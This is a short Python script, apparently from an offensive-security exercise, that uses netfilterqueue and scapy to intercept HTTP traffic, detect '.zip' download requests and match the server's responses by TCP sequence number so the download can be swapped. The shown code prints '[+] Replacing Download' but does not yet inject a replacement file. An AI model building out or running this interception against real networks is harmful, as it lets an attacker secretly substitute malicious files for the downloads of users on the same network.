#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            load = str(scapy_packet[scapy.Raw].load)
            if ".zip" in load:
                print("[+] zip Request")
                print(scapy_packet.show())
                ack_list.append(scapy_packet[scapy.TCP].ack)

            print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            seq = scapy_packet[scapy.TCP].seq
            if seq in ack_list:
                print("[+] Replacing Download")
                ack_list.remove(seq)
                print(scapy_packet.show())

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
